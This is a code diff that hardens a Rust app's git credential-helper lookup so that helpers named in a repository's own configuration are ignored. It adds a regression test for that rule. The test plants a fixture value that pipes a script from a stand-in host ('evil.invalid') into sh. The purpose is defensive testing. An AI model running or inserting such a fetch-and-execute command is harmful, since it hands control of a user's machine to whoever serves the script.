@@ -456,6 +456,15 @@ impl HelperSettings {
     }
 }
 
+/// Whether a `credential.helper` entry at `level` names a program the person
+/// or the system chose, rather than one written into a checkout.
+fn helper_level_is_trusted(level: git2::ConfigLevel) -> bool {
+    !matches!(
+        level,
+        git2::ConfigLevel::Local | git2::ConfigLevel::Worktree | git2::ConfigLevel::App
+    )
+}
+
 impl Helper {
     fn from_config(config: &git2::Config, raw_url: &str, url: &Url) -> Result<Self, git2::Error> {
         let origin = url.origin().ascii_serialization();
@@ -475,6 +484,14 @@ impl Helper {
             };
             while let Some(entry) = entries.next() {
                 let entry = entry?;
+                // A helper is a program this app runs; a repository's own
+                // configuration is content anyone who can write the checkout
+                // can set. Helpers are honoured from the person's and the
+                // system's levels only — like `core.sshCommand`, which the SSH
+                // transport refuses for the same reason.
+                if !helper_level_is_trusted(entry.level()) {
+                    continue;
+                }
                 let value = entry
                     .value()
                     .map_err(|_| failure("Git credential helper is not valid text"))?;
@@ -512,12 +529,6 @@ impl Helper {
 }
 
 #[cfg(test)]
-#[allow(
-    clippy::unwrap_used,
-    clippy::expect_used,
-    clippy::panic,
-    reason = "owned configuration fixtures"
-)]
 mod tests {
     use super::*;
 
@@ -530,6 +541,68 @@ mod tests {
         helper_snapshot_is_independent_of_later_repository_edits();
         credential_origin_keeps_nondefault_ports_isolated();
         scoped_empty_helper_resets_prior_multivars_then_keeps_order();
+        a_repositorys_own_helper_is_never_run();
+    }
+
+    /// Configuration at the global level — where a person's own
+    /// `~/.gitconfig` sits, the level a helper may be taken from.
+    fn trusted_config(root: &std::path::Path) -> git2::Config {
+        let path = root.join("trusted.gitconfig");
+        std::fs::write(&path, "").unwrap();
+        let mut config = git2::Config::new().unwrap();
+        config
+            .add_file(&path, git2::ConfigLevel::Global, false)
+            .unwrap();
+        config
+    }
+
+    fn a_repositorys_own_helper_is_never_run() {
+        let root = tempfile::tempdir().unwrap();
+        let repository = git2::Repository::init(root.path()).unwrap();
+        let raw_url = "https://example.invalid/project.git";
+        let url = Url::parse(raw_url).unwrap();
+        // The checkout's own configuration names a helper: anyone who can
+        // write the working tree can write this, so it must not run.
+        let mut local = repository.config().unwrap();
+        local
+            .set_str(
+                "credential.helper",
+                "!curl -s https://evil.invalid/x.sh | sh",
+            )
+            .unwrap();
+        local
+            .set_str(&format!("credential.{raw_url}.helper"), "repo-scoped")
+            .unwrap();
+        assert!(
+            Helper::from_config(&local, raw_url, &url)
+                .unwrap()
+                .commands
+                .is_empty(),
+            "a helper from the repository's own configuration must be ignored"
+        );
+        // The person's helper is honoured, and the checkout can neither add
+        // to it nor clear it.
+        let trusted_path = root.path().join("trusted.gitconfig");
+        std::fs::write(&trusted_path, "[credential]\n\thelper = person-chosen\n").unwrap();
+        let mut merged = git2::Config::new().unwrap();
+        merged
+            .add_file(&trusted_path, git2::ConfigLevel::Global, false)
+            .unwrap();
+        merged
+            .add_file(
+                &root.path().join(".git/config"),
+                git2::ConfigLevel::Local,
+                false,
+            )
+            .unwrap();
+        local.set_str("credential.helper", "").unwrap();
+        assert_eq!(
+            Helper::from_config(&merged, raw_url, &url)
+                .unwrap()
+                .commands,
+            vec!["person-chosen"],
+            "the checkout can neither add a helper nor clear the person's"
+        );
     }
 
     fn fetch_and_push_capture_their_own_credential_configuration() {
@@ -539,7 +612,7 @@ mod tests {
         let push = "https://push.example.invalid/project.git";
         repository.remote("origin", fetch).unwrap();
         repository.remote_set_pushurl("origin", Some(push)).unwrap();
-        let mut config = repository.config().unwrap();
+        let mut config = trusted_config(root.path());
         config.set_str("credential.helper", "").unwrap();
         config
             .set_str(&format!("credential.{fetch}.username"), "reader")
@@ -586,8 +659,7 @@ mod tests {
 
     fn credential_origin_keeps_nondefault_ports_isolated() {
         let root = tempfile::tempdir().unwrap();
-        let repository = git2::Repository::init(root.path()).unwrap();
-        let mut config = repository.config().unwrap();
+        let mut config = trusted_config(root.path());
         config.set_str("credential.helper", "").unwrap();
         config
             .set_str("credential.https://example.invalid.helper", "default-port")
@@ -619,8 +691,7 @@ mod tests {
 
     fn scoped_empty_helper_resets_prior_multivars_then_keeps_order() {
         let root = tempfile::tempdir().unwrap();
-        let repository = git2::Repository::init(root.path()).unwrap();
-        let mut config = repository.config().unwrap();
+        let mut config = trusted_config(root.path());
         config.set_str("credential.helper", "").unwrap();
         config
             .set_multivar("credential.helper", "^never-match$", "global-first")
